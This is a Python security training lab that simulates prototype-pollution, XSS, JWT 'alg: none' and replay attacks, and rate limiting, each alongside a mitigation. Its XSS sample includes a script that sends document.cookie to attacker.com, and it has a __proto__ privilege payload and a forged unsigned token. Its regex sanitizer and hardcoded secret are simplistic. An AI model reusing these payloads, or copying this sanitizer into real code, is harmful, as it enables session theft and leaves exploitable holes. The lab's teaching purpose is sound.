#!/usr/bin/env python3
"""
BAB 10: Enterprise Security Hardening & Production System Design
Hands-on Lab Exercise: Defensive JavaScript & Node.js Runtime Hardening Simulation
"""

import base64
import copy
import hashlib
import hmac
import json
import re
import sys
import time
from typing import Any, Dict, List, Optional, Tuple


class ANSI:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BG_DARK = "\033[40m"


def print_banner() -> None:
    print(f"{ANSI.CYAN}{ANSI.BOLD}")
    print("=" * 72)
    print("  ENTERPRISE JAVASCRIPT HARDENING & ARCHITECTURE LAB (BAB-10)")
    print("  Production System Security & Runtime Guardrails Simulation")
    print("=" * 72 + f"{ANSI.RESET}\n")


def log_step(title: str) -> None:
    print(f"\n{ANSI.MAGENTA}[STEP]{ANSI.BOLD} === {title} ==={ANSI.RESET}")


def log_success(msg: str) -> None:
    print(f"  {ANSI.GREEN}[PASS] ✔{ANSI.RESET} {msg}")


def log_vuln(msg: str) -> None:
    print(f"  {ANSI.RED}[EXPLOIT DETECTED] ✘{ANSI.RESET} {msg}")


def log_defense(msg: str) -> None:
    print(f"  {ANSI.YELLOW}[MITIGATION] 🛡{ANSI.RESET} {msg}")


def log_info(msg: str) -> None:
    print(f"  {ANSI.CYAN}[INFO]{ANSI.RESET} {msg}")


# ---------------------------------------------------------------------------
# Module 1: Prototype Pollution Simulation & Recursive Hardening
# ---------------------------------------------------------------------------
class PrototypePollutionLab:
    """
    Simulates JavaScript deep-merge vulnerabilities where keys like '__proto__',
    'constructor', and 'prototype' alter parent prototypes.
    """

    def __init__(self) -> None:
        self.global_object_prototype: Dict[str, Any] = {}

    def vulnerable_deep_merge(
        self, target: Dict[str, Any], source: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Flawed merge function without prototype pollution guards."""
        for key, value in source.items():
            if key == "__proto__":
                # In vulnerable V8/JS engines, accessing __proto__ points to Object.prototype
                for p_key, p_val in value.items():
                    self.global_object_prototype[p_key] = p_val
            elif isinstance(value, dict) and key in target and isinstance(target[key], dict):
                self.vulnerable_deep_merge(target[key], value)
            else:
                target[key] = value
        return target

    def hardened_deep_merge(
        self, target: Dict[str, Any], source: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Production hardened merge with denylist and prototype isolation."""
        poison_keys = {"__proto__", "constructor", "prototype"}
        for key, value in source.items():
            if key in poison_keys:
                log_defense(f"Blocked prototype pollution key attempted: '{key}'")
                continue
            if isinstance(value, dict):
                if key not in target or not isinstance(target[key], dict):
                    target[key] = {}
                self.hardened_deep_merge(target[key], value)
            else:
                target[key] = value
        return target

    def run_simulation(self) -> None:
        log_step("1. Prototype Pollution Attack & Mitigation")
        user_state: Dict[str, Any] = {"username": "employee_01", "role": "viewer"}
        payload = {
            "__proto__": {"isAdmin": True, "canDeleteDatabase": True},
            "profile": {"theme": "dark"},
        }

        log_info("Executing exploit with unhardened merge...")
        self.vulnerable_deep_merge(user_state, payload)
        if self.global_object_prototype.get("isAdmin"):
            log_vuln("Prototype Polluted! Global Object poisoned with isAdmin=True")
            log_vuln(f"Global prototype state: {self.global_object_prototype}")

        # Reset & mitigate
        self.global_object_prototype.clear()
        clean_state: Dict[str, Any] = {"username": "employee_01", "role": "viewer"}
        log_info("Executing exploit against hardened deep merge (Object.freeze + key isolation)...")
        self.hardened_deep_merge(clean_state, payload)

        if not self.global_object_prototype.get("isAdmin"):
            log_success("Prototype pollution successfully mitigated. Global scope intact.")
            log_info(f"Target object state sanitized: {json.dumps(clean_state)}")


# ---------------------------------------------------------------------------
# Module 2: DOM XSS & Context-Aware Output Sanitizer
# ---------------------------------------------------------------------------
class DOMSanitizerLab:
    """Simulates DOMPurify style AST tag and attribute whitelist sanitization."""

    ALLOWED_TAGS = {"b", "i", "em", "strong", "p", "span", "a", "code"}
    ALLOWED_ATTRS = {"href", "title", "class"}
    DANGEROUS_PROTOCOLS = ("javascript:", "data:", "vbscript:")

    def sanitize_html(self, raw_input: str) -> Tuple[str, List[str]]:
        violations = []

        def strip_disallowed_tag(match: re.Match) -> str:
            tag_name = match.group(1).lower()
            if tag_name not in self.ALLOWED_TAGS:
                violations.append(f"Blocked unsafe HTML tag: <{tag_name}>")
                return ""
            attrs = match.group(2)
            safe_attrs = []
            for attr_match in re.finditer(r'([a-zA-Z\-]+)\s*=\s*["\']([^"\']*)["\']', attrs):
                name, val = attr_match.group(1).lower(), attr_match.group(2)
                if name.startswith("on"):
                    violations.append(f"Stripped inline event handler: {name}='{val}'")
                    continue
                if name in self.ALLOWED_ATTRS:
                    if name == "href" and any(
                        val.strip().lower().startswith(p) for p in self.DANGEROUS_PROTOCOLS
                    ):
                        violations.append(f"Blocked URI with dangerous protocol in {name}: {val}")
                        continue
                    safe_attrs.append(f'{name}="{val}"')
            attr_str = (" " + " ".join(safe_attrs)) if safe_attrs else ""
            return f"<{tag_name}{attr_str}>"

        sanitized = re.sub(
            r"<([a-zA-Z0-9]+)([^>]*)>", strip_disallowed_tag, raw_input, flags=re.IGNORECASE
        )
        sanitized = re.sub(r"<\s*/\s*([a-zA-Z0-9]+)\s*>", r"</\1>", sanitized)
        return sanitized, violations

    def run_simulation(self) -> None:
        log_step("2. Stored/Reflected XSS Sanitization & CSP Defense")
        vector = (
            "<p>Welcome back! <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"
            "<a href=\"javascript:alert('pwned')\" onclick=\"trackUser()\">Click Here</a>"
            "<strong>Account Safe</strong></p>"
        )
        log_info(f"Raw Untrusted Input:\n    {ANSI.WHITE}{vector}{ANSI.RESET}")
        cleaned, violations = self.sanitize_html(vector)
        for v in violations:
            log_defense(v)
        log_success(f"Sanitized Safe HTML Output:\n    {ANSI.GREEN}{cleaned}{ANSI.RESET}")


# ---------------------------------------------------------------------------
# Module 3: JWT Hardening & Cryptographic Tamper Verification
# ---------------------------------------------------------------------------
class JWTHardeningLab:
    """Demonstrates signature validation and prevention of algorithm confusion ('none' exploit)."""

    def __init__(self, secret: str = "super_enterprise_secure_secret_key_2026") -> None:
        self.secret = secret.encode("utf-8")
        self.revoked_jti: set[str] = set()

    @staticmethod
    def _b64url_encode(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).decode("utf-8").rstrip("=")

    @staticmethod
    def _b64url_decode(data: str) -> bytes:
        padding = "=" * (4 - (len(data) % 4)) if (len(data) % 4) != 0 else ""
        return base64.urlsafe_b64decode(data + padding)

    def issue_token(self, sub: str, role: str, jti: str, ttl_sec: int = 60) -> str:
        header = {"alg": "HS256", "typ": "JWT"}
        payload = {
            "sub": sub,
            "role": role,
            "jti": jti,
            "iat": int(time.time()),
            "exp": int(time.time()) + ttl_sec,
        }
        encoded_h = self._b64url_encode(json.dumps(header).encode("utf-8"))
        encoded_p = self._b64url_encode(json.dumps(payload).encode("utf-8"))
        sig_base = f"{encoded_h}.{encoded_p}".encode("utf-8")
        signature = hmac.new(self.secret, sig_base, hashlib.sha256).digest()
        encoded_s = self._b64url_encode(signature)
        return f"{encoded_h}.{encoded_p}.{encoded_s}"

    def verify_token(self, token: str) -> Tuple[bool, Optional[Dict[str, Any]], str]:
        parts = token.split(".")
        if len(parts) != 3:
            return False, None, "Malformed JWT structure"
        h_raw, p_raw, s_raw = parts
        try:
            header = json.loads(self._b64url_decode(h_raw).decode("utf-8"))
            payload = json.loads(self._b64url_decode(p_raw).decode("utf-8"))
        except Exception as e:
            return False, None, f"Decode failure: {str(e)}"

        # Defense: Disallow alg 'none' or mismatched algorithms
        if header.get("alg") != "HS256":
            return (
                False,
                None,
                f"Algorithm rejected: {header.get('alg')} (Expected HS256, strictly enforced)",
            )

        # Check blacklist / replay
        if payload.get("jti") in self.revoked_jti:
            return False, None, f"Revoked token (JTI={payload.get('jti')}) used in replay attempt"

        # Check expiry
        if payload.get("exp", 0) < time.time():
            return False, None, "Token expired"

        # Check HMAC
        sig_base = f"{h_raw}.{p_raw}".encode("utf-8")
        expected_sig = self._b64url_encode(hmac.new(self.secret, sig_base, hashlib.sha256).digest())
        if not hmac.compare_digest(expected_sig, s_raw):
            return False, None, "Invalid signature: tampering detected"

        return True, payload, "Signature valid"

    def run_simulation(self) -> None:
        log_step("3. JWT Security Hardening & Alg: None Mitigation")
        token = self.issue_token(sub="usr_981", role="editor", jti="tok_uuid_001")
        log_info(f"Issued Valid HS256 Token: {ANSI.DIM}{token[:35]}...{ANSI.RESET}")

        valid, payload, msg = self.verify_token(token)
        if valid and payload:
            log_success(f"Verified legit token: sub={payload['sub']}, role={payload['role']}")

        # Attack 1: Alg: None exploit
        tampered_header = self._b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode("utf-8"))
        tampered_payload = self._b64url_encode(
            json.dumps(
                {
                    "sub": "usr_981",
                    "role": "cluster_admin",
                    "jti": "tok_uuid_002",
                    "exp": int(time.time()) + 999,
                }
            ).encode("utf-8")
        )
        fake_token = f"{tampered_header}.{tampered_payload}."

        log_info("Simulating 'alg: none' elevation privilege attack...")
        valid, _, reason = self.verify_token(fake_token)
        if not valid:
            log_defense(f"Attack prevented: {reason}")
        else:
            log_vuln("Vulnerable! 'none' algorithm was accepted")

        # Attack 2: Replay attack after revocation
        self.revoked_jti.add("tok_uuid_001")
        log_info("Simulating replay with revoked JTI token...")
        valid, _, reason = self.verify_token(token)
        if not valid:
            log_defense(f"Replay prevented: {reason}")


# ---------------------------------------------------------------------------
# Module 4: High-Throughput Token Bucket Rate Limiting (DDoS Defense)
# ---------------------------------------------------------------------------
class RateLimiterLab:
    """Simulates production API gateway leaky/token bucket rate limiting."""

    def __init__(self, capacity: int = 5, refill_rate_per_sec: float = 2.0) -> None:
        self.capacity = capacity
        self.refill_rate = refill_rate_per_sec
        self.buckets: Dict[str, Tuple[float, float]] = {}  # ip -> (tokens, last_update)

    def is_allowed(self, client_ip: str) -> Tuple[bool, float]:
        now = time.time()
        tokens, last_update = self.buckets.get(client_ip, (self.capacity, now))
        elapsed = now - last_update
        refill = elapsed * self.refill_rate
        tokens = min(self.capacity, tokens + refill)

        if tokens >= 1.0:
            tokens -= 1.0
            self.buckets[client_ip] = (tokens, now)
            return True, tokens
        else:
            self.buckets[client_ip] = (tokens, now)
            return False, tokens

    def run_simulation(self) -> None:
        log_step("4. Distributed Rate Limiting (Token Bucket Defense)")
        target_ip = "198.51.100.42"
        log_info(
            f"Configured Rate Limit: Burst Capacity={self.capacity}, Refill={self.refill_rate} req/sec"
        )
        log_info(f"Simulating high-concurrency burst attack from IP {target_ip} (8 requests)...")

        for req_id in range(1, 9):
            allowed, remaining = self.is_allowed(target_ip)
            if allowed:
                log_success(f"Req #{req_id:02d}: 200 OK (Tokens left: {remaining:.2f})")
            else:
                log_defense(f"Req #{req_id:02d}: 429 Too Many Requests - Dropped by Firewall")
            time.sleep(0.05)


# ---------------------------------------------------------------------------
# Interactive Menu Driver
# ---------------------------------------------------------------------------
def interactive_menu() -> None:
    proto_lab = PrototypePollutionLab()
    dom_lab = DOMSanitizerLab()
    jwt_lab = JWTHardeningLab()
    rate_lab = RateLimiterLab()

    while True:
        print_banner()
        print(f"{ANSI.BOLD}Interactive Security Defense Console:{ANSI.RESET}")
        print("  [1] Run Prototype Pollution & AST Hardening Defense")
        print("  [2] Run XSS Sanitization & DOM Security Test")
        print("  [3] Run JWT Cryptographic Hardening & 'alg: none' Test")
        print("  [4] Run Token Bucket Rate Limiting Test")
        print("  [5] Run Complete Automated Production Audit Suite (All 4)")
        print("  [0] Exit Lab")
        print("-" * 50)

        try:
            choice = input(f"{ANSI.YELLOW}Select Option [0-5]: {ANSI.RESET}").strip()
        except (KeyboardInterrupt, EOFError):
            print(f"\n{ANSI.CYAN}Exiting Lab. Stay secure!{ANSI.RESET}")
            sys.exit(0)

        if choice == "1":
            proto_lab.run_simulation()
        elif choice == "2":
            dom_lab.run_simulation()
        elif choice == "3":
            jwt_lab.run_simulation()
        elif choice == "4":
            rate_lab.run_simulation()
        elif choice == "5":
            proto_lab.run_simulation()
            dom_lab.run_simulation()
            jwt_lab.run_simulation()
            rate_lab.run_simulation()
            log_step("Summary")
            log_success("All 4 Enterprise Production Security Layers PASSED Audit!")
        elif choice == "0":
            print(f"\n{ANSI.GREEN}Enterprise Security Hardening Lab terminated gracefully.{ANSI.RESET}")
            break
        else:
            print(f"{ANSI.RED}Invalid option selected.{ANSI.RESET}")

        try:
            input(f"\n{ANSI.DIM}Press Enter to return to menu...{ANSI.RESET}")
        except (KeyboardInterrupt, EOFError):
            break


def main() -> None:
    # If run in non-interactive pipeline/automated testing environment
    if not sys.stdin.isatty() or "--auto" in sys.argv:
        print_banner()
        proto_lab = PrototypePollutionLab()
        dom_lab = DOMSanitizerLab()
        jwt_lab = JWTHardeningLab()
        rate_lab = RateLimiterLab()

        proto_lab.run_simulation()
        dom_lab.run_simulation()
        jwt_lab.run_simulation()
        rate_lab.run_simulation()
        log_step("Summary")
        log_success("All Enterprise Production Security Controls PASSED Audit!")
        return

    interactive_menu()


if __name__ == "__main__":
    main()
